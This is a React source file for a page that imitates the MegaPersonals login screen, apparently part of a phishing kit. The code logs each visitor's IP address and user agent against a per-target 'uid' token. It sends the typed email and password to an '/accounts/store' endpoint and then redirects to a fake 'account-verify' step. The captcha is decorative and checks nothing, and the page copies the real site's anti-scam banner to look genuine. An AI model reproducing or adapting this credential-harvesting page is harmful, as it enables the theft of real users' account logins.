import { useEffect, useRef, useState } from 'react';
// import Logo from '../../assets/megapersonals/images/logo.png';
// import ReloadButton from '../../assets/megapersonals/images/reloadButton.png';
import { useNavigate, useSearchParams } from 'react-router-dom';
import request from '../../utils/request';
import { Helmet } from 'react-helmet';
import PageLoader from '../../Components/PageLoader';
import { captchaData } from '../../data/captchaData';


const Home = () => {
   const [searchParams, setSearchParams] = useSearchParams();
   const navigate = useNavigate();
   const captchaImage = useRef(null)
   const [currentCaptchaIndex, setcurrentCaptchaIndex] = useState(Math.floor(Math.random() * 10))

   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')

   const showCaptcha = (index) => {
      if (captchaImage.current) {
         captchaImage.current.src = `megapersonals/images/captchas/${captchaData[index].name}`
      }     
   }

   const handleCaptchaChange = () => {
      setcurrentCaptchaIndex(currentCaptchaIndex + 1);

      if(currentCaptchaIndex >= (captchaData.length - 1)){
         setcurrentCaptchaIndex(0);
      }

      showCaptcha(currentCaptchaIndex);
   }

   const handleVisitorInfo = async () => {

      let ipAddress = null;

      try {
         const response = await request.get('https://api.ipify.org?format=json')
         ipAddress = response.data.ip;
         
      } catch (err) {
         console.error('Error fetching the IP:', err)
      }

      try {
         await request.post('/visitor-information/store', {
            user_access_token: searchParams.get("uid"),
            site: 'megapersonals',
            user_agent: window.navigator.userAgent,
            ip_address: ipAddress
         });
         
      } catch (error) {
         if (error.status === 403) {
            navigate('/page-not-found'); 
         }

         console.log(error);
      }
   }

   const handleSubmit = async (e) => { 
      e.preventDefault();

      try {
         const { data } = await request.post('/accounts/store', {
            email,
            password,
            user_access_token: searchParams.get("uid"),
            site: 'megapersonals',
            user_agent: window.navigator.userAgent
         });

         if (data.success) {
            window.location.href = '/megapersonals/account-verify?token=' + data.account_access_token
         }
         
      } catch (error) {
         if (error.status === 403) {
            navigate('/page-not-found'); 
         }

         console.log(error);
      }
   }

   useEffect(() => {
      showCaptcha(currentCaptchaIndex);
   }, [currentCaptchaIndex])

   useEffect(() => { 
      if (!searchParams.get("uid")) {
         navigate('/page-not-found'); 
      } else {
         handleVisitorInfo()
      }
   }, [searchParams])

   return (
      <>
         <Helmet>
            <link rel="icon" href="src/assets/megapersonals/images/devilgirl_favicon.ico" type="image/x-icon" />
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" />
            <link rel="stylesheet" href="megapersonals/css/style.css" />
            <title>MegaPersonals: Classified hookups</title>
         </Helmet>
         
         <PageLoader>
            <div className="container login-page">
         <a href="#">
         <img src='megapersonals/images/logo.png' className="img-responsive center-block img-width-72 header-top-margin" alt="Megapersonals"/>
         </a>
         <div className="centered top-margin-25 login_firsttime">
            <h3 className="logincopy">Is this your first time posting?</h3>
            <a href="#" className="starthere">Start Here</a>
         </div>
         <div className="centered loginform">
            <h2 className="logincopy">Already have an account?</h2>
            <form id="loginFormId" onSubmit={handleSubmit} className="loginwrapper">
                <input type="hidden" name="site" value=""/>
                <input type="hidden" name="user_access_token" value=""/>

               <div className="centered form-input">
                  <input
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
                     type="email"
                     id="person_username_field_login"
                     name="email" placeholder="Email"
                     className="form-control bordered three-radius"
                  />
               </div>
               <div className="centered form-input">
                  <input
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     type="password"
                     id="person_password_field_login"
                     name="password"
                     placeholder="Password"
                     className="form-control bordered three-radius"
                  />
               </div>
               <div className="centered form-input automargin">
                  <div className="cap_wrap">
                     <div className="captcha_image">
                        <img id="captcha_image_itself" ref={captchaImage} src='megapersonals/images/captchas/captch1.png'/>
                     </div>
                     <div className="replyCaptchaReloadButton">
                        <a id="changeCaptcha" onClick={handleCaptchaChange}>
                        <img src='megapersonals/images/reloadButton.png' width="40" height="40"/>
                        </a>
                     </div>
                  </div>
                 <input type="text" id="captcha_code" name="captcha" className="form-control bordered three-radius clickToHideErrorMessages" placeholder="Enter code from the picture"/>
                  <button id="login_data_submit_button" type="submit" aria-haspopup="true">Submit</button>
               </div>
            </form>
         </div>
         <div className="centered loginwrapper scammed-wrapper" style={{ marginTop: '36px' }}>
            <div className="get-scammed-banner">
               <div className="caption">Don't get scammed!</div>
               <div className="body">
                  <div>Is the address up top:<br/>megapersonals.eu</div>
                  <div>?</div>
               </div>
            </div>
            <a className="passreset" href="3">FORGOT PASSWORD?</a>
         </div>
         </div>
         <footer>
            <nav>
               <ul className="pager myStyle">
                  <li>
                     <a id="homeclick" href="#">Home</a>
                  </li>
                  <li>|</li>
                  <li><a href="#">Manage Posts</a></li>
                  <li>|</li>
                  <li><a href="#">Contact Us</a></li>
                  <li>|</li>
                  <li><a href="#">Policies &amp; Terms</a></li>
               </ul>
            </nav>
            <div className="copyright_class" id="copyrigh">Copyright ©2022 MegaPersonals.eu </div>
         </footer>
         </PageLoader>
      </>
   )
}

export default Home